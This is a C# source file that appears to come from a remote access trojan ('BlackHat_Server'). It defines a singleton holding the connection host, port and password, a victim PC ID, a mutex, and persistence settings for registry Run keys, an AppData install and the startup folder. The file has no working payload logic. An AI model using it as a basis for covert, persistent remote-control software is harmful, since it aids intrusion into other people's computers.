using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;


namespace BlackHat_Server
{
    class ST_Client
    {
        #region SINGLETON
        private static ST_Client _instance;

        private ST_Client()
        {

        }

        public static ST_Client Instance
        {
            get
            {
                if (_instance == null)
                    _instance = new ST_Client();

                return _instance;
            }

        }
        #endregion


        #region PROPRIETA'

      

        /// <summary>
        /// VERSIONE DEL SERVER
        /// </summary> 
        public string ServerVersion { get; set; }

        private List<NetworkStream> _listaCanali = new List<NetworkStream>();
        /// <summary>
        /// Lista degli stream attivi
        /// </summary>
        public List<NetworkStream> nsListaCanali
        {
            get { return _listaCanali; }
            set { _listaCanali = value; }
        }
        //---------------------------


        //CONNESSIONE
        private TcpClient _connessione = new TcpClient();
        public TcpClient Connessione
        {
            get { return _connessione; }
            set { _connessione = value; }
        }
        //-----------------------------

        // SONO CONNESSO AL MAIN NETWORKSTREAM
        private bool _isConnected = false;
        public bool isConnected
        {
            get { return _isConnected; }
            set { _isConnected = value; }
        }
        //-------------------------------


        // PASSWORD DI CONNESSIONE
        private string _psw;
        public string Password
        {
            get { return _psw; }
            set { _psw = value; }
        }
        //-------------------------------

        // PORTA DI CONNESSIONE
        private int _port;
        public int Port
        {
            get { return _port; }
            set { _port = value; }
        }
        //-------------------------------

        // HOST DI CONNESSIONE
        private string _host;
        public string Host
        {
            get { return _host; }
            set { _host = value; }
        }
        //-------------------------------


        private string _servName;
        /// <summary>
        /// Nome del server        
        /// </summary>
        public string ServerName
        {
            get { return _servName; }
            set { _servName = value; }
        }
        //-------------------------------

        private string _uID;
        /// <summary>
        /// ID Univoco del PC    
        /// </summary>
        public string UnivoqueID
        {
            get { return _uID; }
            set { _uID = value; }
        }
        //-------------------------------


        /// <summary>
        /// MUTEX
        /// </summary>
        public string sMutex { get; set; }
        
        #endregion

      

        #region INSTALLATION

        public bool bUseHKCU { get; set; }
        public bool bUseExplorer { get; set; }
        public string sAppDataInstall { get; set; }
        public bool bUseStartupFolder { get; set; }
        public string sStartupFileName { get; set; }

        public string sHKCUEntry { get; set; }
        public string sExplorerEntry { get; set; }


        #endregion



        #region METHODS

        /// <summary>
        /// Chiude tutti i canali ad eccezione del cnale principale
        /// </summary>
        public void CloseAllChannels()
        {
            foreach (var item in nsListaCanali)
            {
                try
                {
                    item.Close();
                }
                catch 
                {
                    
                }
                
            }

            nsListaCanali.Clear();
        }
        //----------------------------------------

        #endregion





    }
}
